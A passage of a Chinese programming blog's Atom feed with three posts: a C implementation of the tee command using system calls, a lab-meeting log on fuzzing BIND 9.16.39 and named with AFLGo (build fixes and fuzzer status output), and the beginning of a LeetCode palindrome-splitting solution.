&lt;p&gt;tee命令是从标准输入中读取数据，直至文件结尾，随后将数据写入标准输出和命令行参数所指定的文件。(44.7节讨论FIFO时，会展示使用tee命令的一个例子。)请使用IO系统调用实现tee命令。默认情况下，若已存在与命令行参数指定文件同名的文件，tee命令会将其覆盖。如文件已存在，请实现-a命令行选项&lt;code&gt;tee-a file&lt;/code&gt;在文件结尾处追加数据。(请参考附录B中对getopt)函数的描述来解析命令行选项。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;预处理与函数声明&quot;&gt;&lt;a href=&quot;#预处理与函数声明&quot; class=&quot;headerlink&quot; title=&quot;预处理与函数声明&quot;&gt;&lt;/a&gt;预处理与函数声明&lt;/h3&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// 使用变量errno&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; bool char&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; false 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; true 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; strcmp(a,b) strcmp(a,b)==0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// exit code&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; UNSUPPORTED_ARG 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; FILE_OPEN_FAIL 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; STDOUT_WRITE_FAIL 3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; STDERR_WRITE_FAIL 4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; STDIN_READ_FAIL 5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; PARTIAL_WRITE_OCCURED 6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; FILE_CLOSE_FAIL 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; FILE_WRITE_FAIL 8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 函数声明&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;printHelp&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;printVersion&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;writeErr&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;* str)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;writeStdout&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;* str)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;exitErr&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; * err, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; exitcode)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 常量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; MAX_FILE_COUNT 100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; READ_BUFFER_SIZE 100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 全局资源&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; **files = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; *fds = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; fileCount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;不引用c的库函数，直接使用系统调用对文件进行读写，不引入&lt;code&gt;stdio.h&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;工具函数&quot;&gt;&lt;a href=&quot;#工具函数&quot; class=&quot;headerlink&quot; title=&quot;工具函数&quot;&gt;&lt;/a&gt;工具函数&lt;/h3&gt;</summary>
    
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/categories/linux/"/>
    
    
    <category term="Linux/UNIX系统编程手册" scheme="https://jingtianer.github.io/home/tags/Linux-UNIX%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>十一周记录</title>
    <link href="https://jingtianer.github.io/home/2023/03/21/%E7%BB%84%E4%BC%9A/%E5%8D%81%E4%B8%80%E5%91%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://jingtianer.github.io/home/2023/03/21/%E7%BB%84%E4%BC%9A/%E5%8D%81%E4%B8%80%E5%91%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2023-03-21T04:15:37.000Z</published>
    <updated>2023-03-23T03:21:16.857Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fuzz旧版本bind"><a href="#fuzz旧版本bind" class="headerlink" title="fuzz旧版本bind"></a>fuzz旧版本bind</h2><p>|版本号|来源|fuzzer|<br>|-|-|<br>|9.16.39|release|</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>问题1:</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dns_rdata_fromwire_text.lto.o:ld-temp.o:<span class="keyword">function</span> LLVMFuzzerTestOneInput: error: undefined reference to <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">dns_rdata_fromwire_text.lto.o:ld-temp.o:<span class="keyword">function</span> LLVMFuzzerTestOneInput: error: undefined reference to <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">dns_rdata_fromwire_text.lto.o:ld-temp.o:<span class="keyword">function</span> nullmsg: error: undefined reference to <span class="string">&#x27;debug&#x27;</span></span><br></pre></td></tr></table></figure><p>在文件<code>bind9/fuzz/dns_rdata_fromwire_text.c</code>下，定义了外部变量<code>debug</code>，但是该文件并没有与其他文件链接，改为该文件中的全局变量</p><ul><li>问题2:</li></ul><p>分析：</p><ul><li>在该文件夹下手动编译该文件，可以正常编译，生产.so文件，且通过make生产的文件缺少运行权限</li><li>通过手动编译该文件，继续make，可以顺利继续编译，并且所有so都存在相同问题<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/ubuntu/build/llvm_tools/build-llvm/msan/aflgo/afl-clang-fast -Wl,--export-dynamic -shared -o <span class="variable">$@</span> filter-aaaa.o </span><br><span class="line">/home/ubuntu/build/llvm_tools/build-llvm/msan/aflgo/afl-clang-fast -Wl,--export-dynamic -shared -o filter-aaaa.so filter-aaaa.o</span><br></pre></td></tr></table></figure></li></ul><p>解决：</p><ul><li>手动对so库编译</li></ul><h3 id="挖掘情况"><a href="#挖掘情况" class="headerlink" title="挖掘情况"></a>挖掘情况</h3><p>aflgo挖的很快，在第4分钟时就出了一个crash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">               american fuzzy lop 2.52b (dns_rdata_fromwire_text)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 7 hrs, 48 min, 9 sec       │  cycles <span class="keyword">done</span> : 0      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 1 min, 30 sec       │  total paths : 820    │</span><br><span class="line">│ last <span class="built_in">uniq</span> crash : 0 days, 0 hrs, 23 min, 20 sec      │ <span class="built_in">uniq</span> crashes : 14     │</span><br><span class="line">│  last <span class="built_in">uniq</span> hang : none seen yet                      │   <span class="built_in">uniq</span> hangs : 0      │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 169 (20.61%)      │    map density : 1.88% / 15.43%        │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 1.67 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : havoc                 │ favored paths : 300 (36.59%)           │</span><br><span class="line">│ stage execs : 4070/6552 (62.12%)    │  new edges on : 394 (48.05%)           │</span><br><span class="line">│ total execs : 844k                  │ total crashes : 62 (14 unique)         │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 37.74/sec (slow!)     │  total tmouts : 808 (19 unique)        │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : 25/72.1k, 22/72.0k, 15/72.0k          │    levels : 5          │</span><br><span class="line">│  byte flips : 1/9007, 0/2844, 1/2838                │   pending : 794        │</span><br><span class="line">│ arithmetics : 102/157k, 2/55.1k, 0/10.3k            │  pend fav : 285        │</span><br><span class="line">│  known ints : 3/16.1k, 2/73.4k, 6/121k              │ own finds : 727        │</span><br><span class="line">│  dictionary : 0/0, 0/0, 0/0                         │  imported : n/a        │</span><br><span class="line">│       havoc : 561/165k, 0/0                         │ stability : 99.90%     │</span><br><span class="line">│        trim : 63.40%/4616, 67.84%                   ├────────────────────────┘</span><br><span class="line">^C────────────────────────────────────────────────────┘          [cpu002: 87%]</span><br></pre></td></tr></table></figure><p>转到服务器上，cpu核心多一点，可以并行挖。10小时挖出41+75+77+71</p><h3 id="crash-分析"><a href="#crash-分析" class="headerlink" title="crash 分析"></a>crash 分析</h3><h2 id="对named-fuzz"><a href="#对named-fuzz" class="headerlink" title="对named fuzz"></a>对named fuzz</h2><table><thead><tr><th>版本号</th><th>来源</th></tr></thead><tbody><tr><td>9.16.39</td><td>release</td></tr></tbody></table><h3 id="问题解决-1"><a href="#问题解决-1" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>如何调试<ul><li>先直接运行named，通过<code>-g</code>参数显示debug信息</li></ul></li><li>如何fuzz<ul><li>使用参数<code>-A</code>，可以指定named的角色</li><li>使用参数<code>-c</code>可指定配置文件，配合<code>@@</code>占位，可以将afl输入作为配置文件</li></ul></li><li>named配置文件<ul><li>使用<code>-c</code>可指定配置文件</li><li>如果使用<code>-A</code>进行fuzz，需要手动配置其配置文件，只需一个空文件即可。</li></ul></li></ul><h3 id="A参数"><a href="#A参数" class="headerlink" title="-A参数"></a>-A参数</h3><h4 id="lt-mode-gt-lt-address-gt-lt-port-gt"><a href="#lt-mode-gt-lt-address-gt-lt-port-gt" class="headerlink" title="&lt;mode&gt;:&lt;address&gt;:&lt;port&gt;"></a>&lt;mode&gt;:&lt;address&gt;:&lt;port&gt;</h4><p>这个参数从标准输入中读取AFL中的输出，查询blobs，并将其发送到指定的相应tcp侦听端口</p><ul><li>mode可选<ul><li>tcp</li><li>http</li><li>rndc</li></ul></li></ul><h4 id="client-lt-address-gt-lt-port-gt"><a href="#client-lt-address-gt-lt-port-gt" class="headerlink" title="client:&lt;address&gt;:&lt;port&gt;"></a>client:&lt;address&gt;:&lt;port&gt;</h4><p>创建线程从标准输入读取AFL的模糊查询消息，并将其发送到named的监听端口(DNS)</p><h4 id="resolver-lt-saddress-gt-lt-sport-gt-lt-raddress-gt-lt-rport-gt"><a href="#resolver-lt-saddress-gt-lt-sport-gt-lt-raddress-gt-lt-rport-gt" class="headerlink" title="resolver:&lt;saddress&gt;:&lt;sport&gt;:&lt;raddress&gt;:&lt;rport&gt;"></a>resolver:&lt;saddress&gt;:&lt;sport&gt;:&lt;raddress&gt;:&lt;rport&gt;</h4><p>创建线程从标准输入中读取AFL中的模糊消息，将侦听器设置为远程。</p><ul><li><p>&lt;raddress&gt;:&lt;rport&gt;会通过root zone配置为aaaaaaaaaaa .example的权威服务器。</p></li><li><p>&lt;saddress&gt;:&lt;sport&gt;为named监听的socket</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;fuzz旧版本bind&quot;&gt;&lt;a href=&quot;#fuzz旧版本bind&quot; class=&quot;headerlink&quot; title=&quot;fuzz旧版本bind&quot;&gt;&lt;/a&gt;fuzz旧版本bind&lt;/h2&gt;&lt;p&gt;|版本号|来源|fuzzer|&lt;br&gt;|-|-|&lt;br&gt;|9.16.39|release|&lt;/p&gt;
&lt;h3 id=&quot;问题解决&quot;&gt;&lt;a href=&quot;#问题解决&quot; class=&quot;headerlink&quot; title=&quot;问题解决&quot;&gt;&lt;/a&gt;问题解决&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;问题1:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;dns_rdata_fromwire_text.lto.o:ld-temp.o:&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; LLVMFuzzerTestOneInput: error: undefined reference to &lt;span class=&quot;string&quot;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dns_rdata_fromwire_text.lto.o:ld-temp.o:&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; LLVMFuzzerTestOneInput: error: undefined reference to &lt;span class=&quot;string&quot;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dns_rdata_fromwire_text.lto.o:ld-temp.o:&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; nullmsg: error: undefined reference to &lt;span class=&quot;string&quot;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在文件&lt;code&gt;bind9/fuzz/dns_rdata_fromwire_text.c&lt;/code&gt;下，定义了外部变量&lt;code&gt;debug&lt;/code&gt;，但是该文件并没有与其他文件链接，改为该文件中的全局变量&lt;/p&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-24</title>
    <link href="https://jingtianer.github.io/home/2023/03/18/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9324/"/>
    <id>https://jingtianer.github.io/home/2023/03/18/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9324/</id>
    <published>2023-03-18T03:14:34.000Z</published>
    <updated>2023-03-19T08:43:39.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1616-分割两个字符串得到回文串"><a href="#1616-分割两个字符串得到回文串" class="headerlink" title="1616. 分割两个字符串得到回文串"></a>1616. 分割两个字符串得到回文串</h2><h3 id="ac代码"><a href="#ac代码" class="headerlink" title="ac代码"></a>ac代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkPalindromeFormation</span><span class="params">(string a, string b)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = a.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">bool</span> flaga = <span class="literal">true</span>, flagb = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i] == b[len<span class="number">-1</span>-i]) &#123;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i; j &lt; len<span class="number">-1</span>-i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[j] != b[len<span class="number">-1</span>-j]) &#123;</span><br><span class="line">                flagb = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i; j &lt; len<span class="number">-1</span>-i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j] != a[len<span class="number">-1</span>-j]) &#123;</span><br><span class="line">                flaga = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flaga || flagb) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        flaga = flagb = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[len<span class="number">-1</span>-i] == b[i]) &#123;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i; j &lt; len<span class="number">-1</span>-i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j] != a[len<span class="number">-1</span>-j]) &#123;</span><br><span class="line">                flaga = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i; j &lt; len<span class="number">-1</span>-i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[j] != b[len<span class="number">-1</span>-j]) &#123;</span><br><span class="line">                flagb = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            